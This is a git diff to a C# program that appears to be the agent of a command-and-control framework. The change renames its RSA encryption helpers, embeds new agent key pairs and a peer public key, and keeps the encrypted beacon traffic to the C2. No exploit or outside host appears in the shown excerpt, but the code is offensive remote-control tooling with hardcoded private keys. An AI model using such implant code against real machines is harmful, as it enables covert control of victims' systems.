@@ -37,41 +37,42 @@ class Program
     public static readonly int BeaconDelayMin = 500;
     public static readonly int BeaconDelayMax = 1000;
 
-    // Ensure that this contains the RSA Private Key for the Agent, which is used to decrypt data received
+    // Ensure that this contains the RSA Public / Private Key for the Agent, which is used to decrypt data received
     // from the C2. Utilize the RSAKeyHelper Tool to generate a fresh pair of Private and Public keys.
-    public static readonly string EncodedPrivateKey = "MIIJKQIBAAKCAgEAv/20iZMlxpwnmLmhll6ehiFicNgcxiUHlHp68B7lK/cVuFBljrDV4h9mM24uW9J2An726JXUaXJzj6RbNapZV+9NBMOzrlKYGBBd4CngzTGPeji3Uy90gC57x/voDrAd5AFRwqQSXgxNVodWjI9tLF8G36gvtHs69nexRi065CMlbEnqB4zSpiYHboGRkrc953o7sVSb0v39b5xpBu1DUO/gI7XpcdsXvutMcel6+tQPVXRt4AyCuLrM9AQ7Xc2ZrYNk8GL1G/GnFCuHzEvItfUTrzDifl3lqbfUSjfDFazTVmi+bYqSpvNjh5nYtuMxb+dMJ9Us52OMxiArX0ocCSD5Kjwy8aekQmwuArqi/E5W2Gp5LCAln8KztI2UKB5NWtmPmzxX9SkbR9z1St5YZcLuk+ju201HJCAfOpI1T6hSa7Di1FShmvQxKyjOMg7+lytlrtl8K68wvoS/y+ewDXYomP1sbZhh++CCcisM7jvmlgUrIIiLVQf9j5MNSG7fgzO5BkGW+lcqWqRlb9YFqstZ8rMDRefn4iNfpqbXasyNSGTpLsXhRfYVFEJdoLr+AF+DSaU6NmTwA+CmTUQNrwo1fXkscgNRqK6jlaxTdZUiGMolmP187L0Us1iY4g9H8MKQzri0Lk82ZGsB33WhcYXm3LmmIKEBWMBidcN3/xECAwEAAQKCAgEAsp7q0bgqRB7SJCBIuuqrF+WFfbFDDAI1jClrqW1FD+NgvMtnwRq60xcdcaoHzXwAORBAzWFgbv6Bj1l9Vm93kf1crZsZ14yWXoUTodO0h5OdhjuwK9+RxxP4K7YtT0UBejjUBX+6au+NIHznw/xIuShr77e9MnAYCmiPcNfx24Drd1VJO98DuHrXHTPE6Tg8itjJIpGyK9oMaUOe30ftAic6ZF8BouEQtZqa07xCo4yZ+4pIE1PwZse8mSY6yWnYmXsOdSvMGUR5iqV5QVQcl1U9DBgyERlw67bQ9n/sq4TQVqs6yBVNnbABoI489uJnA1KxIroNffW7ajVRxOThMOnoYnZBTYpLX0CwTfacZrNharJOKy0lPP8DvTTx/b+ecHdPmAAktqJoirrF7w3qfzJzvkfP0f0C9mO0CbW7lfwdN6nkrclU0x76V/40BkOxKm9Wte8LHRSr3ySZLLNs4/Rk1dEH9s/nAv14vK5h/Ugm2uFlXE9w22PD768P2XLbABGNK29wL/2X1+Pscn3m8qn7zN1w2u0/MoFxXCiDAlM1mws2+kCfsFoKCts7kA12qSKTUVYm/cDy4aJg5FRl8cqtVxLKpt1Gx8NmFxGQIgfH4wfobFkrZRLezeWNmqbx6N1j+w/c+ShO9JGkJPrvl4NVECPT71EPybPKPFtYxBUCggEBAMYA/iDl/Jjx5WPXGaBuxXEA9NTBgMNeCeXMXQulW7P66vJA5qj6KG0lSoxA9s5CzX0RsrNCiRkPsCt+01WHJXFkRRkkntkAhgbx8i9jKuRZz/VMawJy8wZJde4gj5wfczg+gc9vUWwQwJ3dtsE6AtQoO+Z0Cug98UwZkRACvLpWU6NHH8TnKlxE+jFTSH+x82IOWo7pSagN33Gys7GSzxU35z+9bd0AlQWZPWr+qs9uKQkuAzVpQBmmDMMR8aRYHaEXDs10jT5WFv8Up+6wp3cY1Q9Jm4Eup2WYin3QZQD1TaGv10FzSEAOW3M8o4HfwSsGE7VfovgfLfy9HcXZdecCggEBAPg52WAJW1Yk8uEvdlBEfauceabRn3u61W662CdCay+t/sUIwGQ9EYxmDaAa6+AuMZ4q5y6Rlu94InRC+HVeScFsfKiyB7oNF66NRBCMSHFuDrtlA77ZCbQqC8L2Pc7vmRT0NmJRCCvwr4NE6EIF0xUQhsiOG4niqH/3lCQQGSo9veka9vBRNmFRHU6Jo6jupmpuYD+ew4452S0BVoYTiTQlHaDrdXAMCZOltTjcNiIU5mi98jPxcVRcAQ+Wb/tHdIwGev9L4eXfJQAmki35/HUZKUNPr2bvoTFlX/fGxTorn/P61Qvpl+OMqbQqhsmN5LDLnkJCOGVPozo7FvKz1EcCggEANa25N2QCOdiCTrHWwbamEj+nIDKhXNWWq1Te+LRIix+AKFLN9Yt0ADr23dUS09IqcTimEJD+J+wn33LPikVMMlRzoyBZbA0HSMS42n3w990dUqv36r8NAWxS606qgDHKg7n2aS0NjtVv0pxz2iiG8ctCifR1rIZ2byITQJrtXTrgC8jRZQkiY8dTaKHiarPsfm3TwSCflk7Ef8dpjb92IpN4PsB1E1AAFnd3vhTya6+6skFmH0m8Vfe9R/kKYHp+9dgRbEOnsvmV3GtWJ5B+pfv2buGOpdPnD9Tt3rPrXfoipK3OFnFRagQ6aKBM1324mZhZKXeW79tMFVOTybptiwKCAQEA9fMb13Rt86UYotcMO+whOPEJ+KirhUVSRS0ND5lX6x5T2ZcaSjfYM2zLA2CpZq9eqoGIHzRSgWRffyL8XA7YtbZwrhX4YfinBmUik+LrxLhwEG2+kFMssj8W+E5UX743x/NSD4iKuD77KO4V05VB2RVO91kXIEBdBK6jMjhhNuGGUnpNQ0C0ySg+CZuHddNBQSOsal09Fqdq8JTqzl59DBXajZ+/9Q14T7tZHMXVPV/IDPBoE9+fkx62TmOZATmD2VpydJMTeVjoqIWPQc74vm333KIQAcZdyTvRIwjoUwL2siBPCEakIOs3GzUn6H2XozWd0bkbeAa4jPIPgtt78QKCAQAHwjwNR/PZSypJd+VGKJWjh2X/idf2v8//hPbEX0J8t/n4M7NpaPJDd1XJ79UeNoViNU7OUbYAsy5rGjLgJK2+HKS1S35ETieoYXKT4tzR5Wa5iCJtbfmH4eEx4KunBt3+FB1GXv4RkUjxbf/9a/4uv8ML0pKkZng0tGOG/Ni7VNBCRTrJFz8MRR6CEef5VmSOKvAw6VcR/mY67Th89P+uGghMo4E+tenUsv7r3wcA5o7o+Hg3tEambPaeJBp3lzairpr5NkouPX5aPXySkY/PHDCqkY26sNDi+g5kR7Ldzxix7hEqkOiO9zrb5PkiwdljsNyejkhhCUt7MB7/66gd";
+    public static readonly string EncodedPublicKey = "MIICCgKCAgEA6+URNSenrF9brgbRwEcxio7/N0D+6ZsL32Kx/j2/GVJPC4q3nwodBZDhsZalzi/CFdk4h0jiDyhTeSmU+Vq8RibQksPI0UbwL3+Mnuhrb13UifGoKMoaIY31vLMEeJ7Onyxnf15XiV4r2LorMHTwlqd1gyMR6dAu5nzshKA8yle06qrPpTP10pw7pR/iznKI/LAyJes/ox5JbO/Z1tmjtMDChx1+FgZB1wbSAlAw7fh04C3KH24vvobd5a1gMLGqBbAu3EWMXhj2Io/8aAq8f1nvau068Dl7tyD6ybD7/pam3XN3O30Grqcp2093ZnQvNbfTTaeLjZ1fs3MFkwzMXxtoKXtivqyLBH96ZI8IEMKG9IDGxPaOfIePJr7AyTinZ1g3Y/IIWor9v+wwAl8QuWf2zOTnBXSzN2jXKUDz29u3ITkhRnZJm0Vkma1Nuo6n7OB5m4lbUTQB4/cMNihUOvDSkPwh+uQF8loNQDLH5zO9oIEpdzoonsMmntOqYQMk2+uPGAF7/p3ZzRDsayhsbuHvnwzVbY8Tp9xedDj85TorehmPJJsTYmDsOahhh57E5Lpcfze32dO83z3slVHp/fYNpfHMLakV/gn0bvJFohCpCvxyUR6zSRVvvrPA0mHUAJPviX5lnenTTg8pwBLiBcGOGvdBromUDqCHlxQgEH0CAwEAAQ=="; 
+    public static readonly string EncodedPrivateKey = "MIIJJwIBAAKCAgEA6+URNSenrF9brgbRwEcxio7/N0D+6ZsL32Kx/j2/GVJPC4q3nwodBZDhsZalzi/CFdk4h0jiDyhTeSmU+Vq8RibQksPI0UbwL3+Mnuhrb13UifGoKMoaIY31vLMEeJ7Onyxnf15XiV4r2LorMHTwlqd1gyMR6dAu5nzshKA8yle06qrPpTP10pw7pR/iznKI/LAyJes/ox5JbO/Z1tmjtMDChx1+FgZB1wbSAlAw7fh04C3KH24vvobd5a1gMLGqBbAu3EWMXhj2Io/8aAq8f1nvau068Dl7tyD6ybD7/pam3XN3O30Grqcp2093ZnQvNbfTTaeLjZ1fs3MFkwzMXxtoKXtivqyLBH96ZI8IEMKG9IDGxPaOfIePJr7AyTinZ1g3Y/IIWor9v+wwAl8QuWf2zOTnBXSzN2jXKUDz29u3ITkhRnZJm0Vkma1Nuo6n7OB5m4lbUTQB4/cMNihUOvDSkPwh+uQF8loNQDLH5zO9oIEpdzoonsMmntOqYQMk2+uPGAF7/p3ZzRDsayhsbuHvnwzVbY8Tp9xedDj85TorehmPJJsTYmDsOahhh57E5Lpcfze32dO83z3slVHp/fYNpfHMLakV/gn0bvJFohCpCvxyUR6zSRVvvrPA0mHUAJPviX5lnenTTg8pwBLiBcGOGvdBromUDqCHlxQgEH0CAwEAAQKCAgB5Ph7+BwezHL/uTir4fJ8F7EFYkNt0DfCoO/3oAqx5w0hFUmLWJ0iLV8/oitllhD5pJGBdiCRITh25JJohH3WtSL3i8SYCCkfg4dnQwvyVHNDkpYQckuOjY2duOUSPCnCAdz4qxL6RKAm5NtaD7VbK1/8aC6hlWE8CwCqAcCtOhI3EH07iRjaOrSYq1JyqJ0wpNBZSTvtCR4rNpul7+BigCoLxF0N65nRopGTEM5sydIT9xAsi5Gs9revW5KmP3YDZs5giNszSgFnhocfFYd9IRV08w/mLBsCDezvq9kBOtffF0lbyCGyqz9g/lDR2QDkTjwvX2clsW/qYLQIsdmODcdcgL/okN7aVqiD3eq7ycFvsO/1objNrExXeoXYJQM8yenvhOAiyVwq2H5GRs4V0KujLjklehJU2bV1BQ3PviStJcZ2WwMhLMzLgG4jz8sY5AhiXbelzGydKiR7X6QHTeA+ndgJ3e3JN2NAKd3TSddhDKNhBZQkRAIL27veUOIrjxMtkGzwaVrzpyE39nq5yvlOSgo0fsKXzbPKiiGv5VOo/irKVDhUjXgLzilZyKcbOVLaoEK3iPtjMQoUee3h9j3H95XZNz/zlKF3kAB7aGA88NS4fWrVwrZOR+PrEpF7SBI8nJmE1yf6hcwy2v6qfOh9R+hmF8K/gLnaUp23OMQKCAQEA8TzKrUrF0Fkk7JXZA0wdib/a2gpjF/PalTk5iXeRUclcpFE55RZzVCL+Vy8YtdC9Bmt4yx+xagYyTnSCbUA4/T9Ct0DZvIQiSH1V+Na3oC4llpVQbXK1LdAzySaW1SQxscarTPez5DSkBPbnPx99jmSvF9+u8TgTksAL62O0t44eEUR3rVutxJOtpi6W3ZXW4kxLJvqqbkh3dqX76Z4pVBFbqe0EM7zu+xxr7hsdUCZreSWO1HgiWY30RAve309JubY3f3xHIsTjHfwAHDkJJ7sXoUTIOwtPK4vbHOsOdb6Zm82UQuJd3u9j9VXgIeIcgLCv+kogB3GcPEz6I7Bp+wKCAQEA+lST3DZHlSDWuM/r6sbySN8z+oGdlBglMhPiZAlTskWHiyUYTCmrY4EgqBEbPE1VezHXjt+FTjolJ9rlFMeGjtvtPpu/dPulWHu+iKZwjoQlhtzF4FkVGoN7dlSDsTuN3jK4zQisfbDzSl9AqnWpApBqbQ/xtefVcdpANEHoB90tLjuaC9U+6+JvwWI/0A0muLom47LrwnrXPfEErMVSQF0Gt3uz3rPcCqeC9rnXSkOyp2mcNvDlrhVrPVsQ2nWME9oUzO79fWOUa/ZkspS2aAXIRqPZI7QMvSOkQuzEFKwEWxOM6vMPj26S7kczDXlmEiae7mi8fK3bAt3Wn50d5wKCAQAl+to1+kW2jbJghR8Lg9pKq6f7GBON29iYEdBbMjXw2HD7dcZVqPkzT+cXNtT/GwQHlLgJ0s2N0bft3i4CoU/XnzQTweQF6A+1tfXpHXT/hQRp9swYzyxzMApXKvooSHCCerLRhVYPIbKJDY5Ow9hyqKtgaNkUJS3/tripsKLtGzTkpxDofDyZbF60gTVDYanZKwXR9zkJ7+LPDUbh+wKqt6jk0eoNczt00X60mBQ/YC0ff6hDDz7pNo40gGHwan1C/cszCQ/yC2lueRRTXS9xz+TigP+9PASU6InwvZkjNITeoLks5pK83JeyMnj9HKo8IJU0JKNySJK+c6gWIlotAoIBAAw3IFf4lhmi1peCHeMA/kWsDp9Ev+nAG+CLs9pp0hm65thVYRAmYGSkonFRFGEm7OrsDba9FYYxtCpztgYDjn9eH/+UHg2ZUgI1V6DXblql/CbOkyFVd4AptlaZ3StC2rNjCj2HFNO1VMnmSAOJZkvnvCnCQ2s6+uFpYwSpyqbHljLRWb0GFOHx1L49Cxwd6CvPeaJW0sZUtDgjkLTVlCPr5i4B7U8Ku8wRTIS5oNXQ4+DjeGn961dJWEhQL0xZvBIj7Cvr5Za+yzlRdqx4MUZ2McWwrSHe4VhBavyRDShtFHFVTOUSI0o+fRD/jHA14lM0a0D6/2eeHDfRl22GfzUCggEAPTG1r4F/DSp82ZbcDLjSBSgFQtHi4T982fNQq2x2uDpBMYURrDSmyjuUA6XVjNiGkzlozTX0QX5NiNzp/Csy6JsQs3XDLyF+bGp6fMCIXPbF0Kitn522rMfp+PXQ6zOFbRLIuQKujxr9B+PRQvPJk6M3st1hkM99xSq+cpkmdnACd8U7XtP98NTGeFZDpdlXeRIDhyJqC9dq0jUUnqdNyNpbL+LDfPhO9J8GqUTRXczMyqhWRiKl1G6EJtCqGm5o2H3xysTHxKw3jl4G4fBiWVxxA/182S+95sijAQHY0txGyNkaIFeiH+7mcv5DI5UsLbL4QEyF4+r0whR5ke+P1Q==";
 
     // Make sure this includes the RSA Public Key belonging to the C2, which is utilized for encrypting
     // data that is sent to the C2's destination.
-    public static readonly string EncodedC2PublicKey = "MIICCgKCAgEAw24iWtReiSmA2R5ncKxC1yHMx3oQPNfKbKYWa6ioLhW5GqDQ/GTyVtH2P+FH6fWLOLj3dxfmJFr8KnmcfbQ1wEtDy/zIc+FJRwU/6xFFgnZ4tXIY+jEvwomOMTEm+cHULZr3+laBI/uQdX5hEUDUg12MYYI+kM4SLjRYvdIKgM+nRITwenZUEEpdcieCdvv77XZ1QGB9gcXKNYfopIqWX7kOJTrO2qbnvvhm+/jSRqglkA3oga3h7n7jfu5jBMY5QOBldA5hM5Dc5+1/iK13NhZY3L6drf8PxuQewsuiorK2K0raK6PDL8pe/ZDmYiIUdehaNyeMiScx7mceU7DxU2JhLzdpxbbPeFHwjvwPl7zMU0JHRZQ9b3kxiflcGYR+yFVq+G5Yc99jDp2lCig+rsEOWkVvJgKcD2HALnyHfbXEVEwT9Qa19PCKq8J9dtEgJ6Su/nO1nyG8nERBEA0q1OEr43MHx5RHxMiMg9GoNjzknwzTB9PrwbjIfuaPFpC5fGzdNPuhzyouVnay7W50XIpqr9DTZjlr0ec9Ln6RWQKoaFcyzLMBY9VZJ+eA1SakqW+Gic/vGDL4cH63NPsxbAVWW7AJzrefd9V1m45kBOQ94qFzfUomwKee2+NqA78UCnyB93QgVmzMSxZ47+Co6KIfy65ije+RJj6sc5dFBnECAwEAAQ==";
+    public static readonly string EncodedPeerPublicKey = "MIICCgKCAgEAwCgvEs3M3Xq9VsIokZcJCiZJBIvnpDsBh+TMHOFKKmkIAS43HtyxOJgCV4tJYyNLtnZXxym2FN4Y0AHuWcuub/4OfwhbmSll1LrcOymNJT8a8uSh2FkxPdYr3/TG18uPEvJ9KJhrPp2qyakCN3/URltcO/tFw7ETmauRKslUCNP1fgq71wE08B2dJfwjWa04x9pem90e5bXVg4JmJtdAoFNI++FFueg+/ohUtg13ZiY+U6Lz2tYcVoHATcMoGfERJeXJaOzOTsDCWxqrjAhQeN+NlFtT4euvH5e3Xb/7EivS4T3fdA0dMAy0iZ4Cf9je8C2GMst0pYwHQcW12LASwrmm90BBz/gFMLsBv/nrptQ1NbkFfdlDPf+kA0Ei3Q6CZoybIr9BOBbEEi59IH+0i3ILJF0YRLcOhaTmC6UKBvItq9YG/68VnFyuqb4cKf7mLN3fhF5RopLWjNGxdkwd5JqGl0dmDEnSjOcWRF46MSd2uVYtICtqVA2WN7IEpnOpbhnmYnwE1Dp/lTy4VW9oBGpnMxbfB2RISdOwFf+h59kDmUlYX1RgButpEmkklOQLOZHYEiLg1Pd5j+OyuTU84zZObcQC1VA8SGq6PStoh5S4dbgPRmEjHG8MBPPHBrr51ozid5T2k8UHOFeBn1QBXuODr0lGVgpyHy6MFtj7Dg0CAwEAAQ==";
 
     // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  
 
-    public static AsymEncryptionHelper? Decryptor;
-    public static AsymEncryptionHelper? PeerEncryptor;
+    public static AsymEncryptionHelper? SelfEncryptionHelper;
+    public static AsymEncryptionHelper? PeerEncryptionHelper;
 
     public static CancellationTokenSource CancellationTokenSource = new();
 
     public static void OnProcessExit(object? sender, EventArgs e)
     {
-        Decryptor?.Dispose();
-        PeerEncryptor?.Dispose();
+        SelfEncryptionHelper?.Dispose();
+        PeerEncryptionHelper?.Dispose();
     }
 
     public static string OnEgressDataModifier(string data)
     {
-        if (PeerEncryptor == null || !PeerEncryptor.HasPublicKey())
+        if (PeerEncryptionHelper == null || !PeerEncryptionHelper.HasPublicKey())
             return data;
 
-        return PeerEncryptor.EncryptToJson(Encoding.UTF8.GetBytes(data));
+        return PeerEncryptionHelper.EncryptToJson(Encoding.UTF8.GetBytes(data));
     }
 
     public static string OnIngressDataModifier(string data)
     {
-        if (Decryptor == null || !Decryptor.HasPrivateKey())
+        if (SelfEncryptionHelper == null || !SelfEncryptionHelper.HasPrivateKey())
             return data;
 
-        return Encoding.UTF8.GetString(Decryptor.DecryptFromJson(data));
+        return Encoding.UTF8.GetString(SelfEncryptionHelper.DecryptFromJson(data));
     }
 
     public static void Main(string[] args)
@@ -92,20 +93,20 @@ class Program
 
         try
         {
-            Decryptor = new(null, EncodedPrivateKey);
+            SelfEncryptionHelper = new(EncodedPublicKey, EncodedPrivateKey);
         }
         catch
         {
-            Decryptor = null;
+            SelfEncryptionHelper = null;
         }
 
         try
         {
-            PeerEncryptor = new(EncodedC2PublicKey, null);
+            PeerEncryptionHelper = new(EncodedPeerPublicKey, null);
         }
         catch
         {
-            PeerEncryptor = null;
+            PeerEncryptionHelper = null;
         }
 
         List<Thread> daemons = new();
